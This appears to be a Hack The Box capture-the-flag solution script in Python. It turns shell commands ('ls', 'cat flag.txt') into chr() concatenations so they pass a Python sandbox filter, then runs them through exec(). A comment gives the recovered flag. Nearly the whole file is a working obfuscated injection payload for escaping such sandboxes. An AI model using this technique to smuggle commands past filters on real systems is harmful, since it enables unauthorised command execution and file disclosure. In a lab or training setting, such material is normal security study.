#s = "from os import *;system('ls')"
s = "from os import *;system('cat flag.txt')"
for i in s:
	print 'chr('+str(ord(i))+')+',

#chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(111)+chr(115)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(42)+chr(59)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41)

#chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(111)+chr(115)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(42)+chr(59)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(41)

#print(exec(chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(111)+chr(115)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(42)+chr(59)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(41)))

#HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
